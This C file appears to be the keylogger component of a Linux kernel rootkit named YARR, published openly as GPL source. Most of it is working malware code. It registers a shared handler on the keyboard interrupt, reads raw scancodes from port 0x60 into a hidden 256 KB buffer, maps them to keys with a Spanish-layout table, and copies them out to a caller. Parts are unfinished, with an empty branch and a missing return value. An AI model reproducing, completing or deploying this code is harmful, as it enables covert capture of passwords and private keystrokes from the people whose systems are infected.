/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

// Most of the code has been developed using
// https://github.com/vigith/Linux-Device-Drivers/ as reference. Thank you
// Vigith.

#include <linux/interrupt.h>
#include <linux/irqreturn.h>
#include <asm/io.h>

#include "keylog.h"
#include "debug.h"

// Size of the buffer where the keystrokes will be stored, 256 KB by default.
#define	KEYBUF_SIZE (1024 * 256)

// TODO: When should we use which port? Study it.
// The keyboard access port is from 0x60 up to 0x6f.
#define KBD_PCI_IO_PORT (0x60)

// The standard IRQ vector for keyboard.
#define KBD_IRQ (1)

// For debugging purposes.
#define N_COLS (20)

// TODO: Ubershitty code, the translation depends on the keymap configured.
// This translation is only "valid" with standard spanish keyboards... that's
// right, I'm from Spain... infoleak.
// TODO: Not even really sure if this array has 256 positions xD.
// TODO: Also I could have made mistakes putting these strings int these
// positions so when printed there could happen that you pressed "w" and a
// "q" is being printed (note that "w" is the next scancode to the "q"), this
// probably means that I forgot to put a code between the beginning of the
// table (<dummy>) and "q".
char *scancodes_trans[] = {
	"<dummy>",
	"<escape>",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"<delete>",
	"<tab>",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"`", // TODO: Really?
	"+", // TODO: Really?
	"<enter>\n",
	"<Lcontrol>",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	"ñ", // TODO: Really?
	"´",
	"ç",
	"<Lshift>",
	"<",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"-",
	"<Rshift>",
	"<dunno what's here :)>", // TODO: Well...
	"<Lalt>",
	" ",
	"<caps_lock>",
	"f1",
	"f2",
	"f3",
	"f4",
	"f5",
	"f6",
	"f7",
	"f8",
	"f9",
	"f10",
	"<num_lock>",
	"<scroll_lock>",
	"KP7",
	"KP8",
	"KP9",
	"KP-",
	"KP4",
	"KP5",
	"KP6",
	"KP+",
	"KP1",
	"KP2",
	"KP3",
	"KP0",
	"KP.",
	"<alt gr>", // TODO: Really?
	"<how did you produce this code?>", // He he he...
	"<dunno what's this code>",
	"f11",
	"f12",
	"<how did you produce this code?>",
	"KPenter\n",
	// TODO: Keep adding scancodes translations.
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	"",
	""
};

// TODO: I think the best approach to this would be a circular buffer, just as
// the kernel logring.
// We will put the keystrokes here.
static unsigned char keysbuf[KEYBUF_SIZE];
static unsigned int keysbuf_idx = 0;
static int allocated;

// The spinlock to access the scancode atomically.
DEFINE_SPINLOCK(scancode_lock);

// This function should be as fast as possible since it is dealing with the
// keyboard at low level.
irq_handler_t kbdIRQHandler(int irq, void *dev_id, struct pt_regs *regs) {
	unsigned char scancode;

	// TODO: Static buffers regular problems, deal with it.
	// TODO: What happens when the buffer is full and we don't call inb?. Is
	// the scancode waiting in the buffer? It doesn't sound really logical
	// because I guess there can be more than one handler in the same IRQ and
	// all of them will read the same scancode under the same IRQ. Ok ok, I
	// know, I should study much more about IRQ handling :-s.

	// TODO: As we can see in Vigith code this shouldn't be here. The handler
	// should be as fast as possible, so here should just take the scancode and
	// return. All the logic of detecting and handling the scancode should be
	// in a bottom halve (BH kernel terminology), as Vigith does.
	spin_lock(&scancode_lock);
	if (keysbuf_idx < KEYBUF_SIZE) {
		scancode = inb(KBD_PCI_IO_PORT);

		// Key pressed.
		if (scancode < 0x80)
			keysbuf[keysbuf_idx++] = scancode;
	}
	spin_unlock(&scancode_lock);

	return (irq_handler_t)IRQ_HANDLED;
}

int init_keylog() {
	allocated = request_irq(KBD_IRQ, (irq_handler_t)kbdIRQHandler, IRQF_SHARED,
							NULL, kbdIRQHandler);
	if (allocated != 0)
		debug("init_keylog(): Couldn't allocate the IRQ handler.\n");

	return allocated;
}

int cpyScanCodes(unsigned char __user *buf, int size) {
	int i, res;

	if (buf == NULL)
		return -1;

	// We have enough space on buffer (hope so) to copy all the scancodes read
	// so far.
	if (size >= keysbuf_idx) {
		res = keysbuf_idx;
		for (i=0; i<keysbuf_idx; i++)
			buf[i] = keysbuf[i];
	}
	// Copy just the size-th last scancodes captured.
	else {
		// TODO: Seguir desarrollando por aqui.
	}
}

void exit_keylog() {
	// Check if the handler was installed, if so uninstall it.
	if (allocated == 0)
		free_irq(KBD_IRQ, kbdIRQHandler);

	return;
}

// Just an auxiliar function that prints the scancodes read.
void print_scancodes() {
	unsigned char curr_key;
	int i;

	debug("Dumping codes:\n");
	debug("[ ");

	i = 0;
	do {
		if ((i % N_COLS) == 0)
			debug("\n\t");

		curr_key = keysbuf[i];
		if (curr_key == 0)
			break;

		debug("%02x, ", curr_key);
		i++;
	} while (0x01ec0ded); 

	debug("]\n");
	return;
}

// As the print_scancodes(), this is just auxiliar and would likely dissapear
// in the future. This one prints the symbols (letters, numbers, special keys)
// of the scancodes. Don't trust what this print because we are dealing with
// the kernel, in userspace any of scancodes can be mapped to different symbols
// from the ones that this function prints via keymaps.
void print_keys() {
	unsigned char curr_key;
	int i;

	debug("Dumping keys (don't trust this):\n");

	i = 0;
	do {
		curr_key = keysbuf[i];
		if (curr_key == 0)
			break;

		if (curr_key > 255)
			debug("\nHEY! Tried to access an invalid position in the key mapping\n");
		else
			debug("%s", scancodes_trans[curr_key]);
		i++;
	} while (0x01ec0ded); 

	debug("\n");
	return;
}

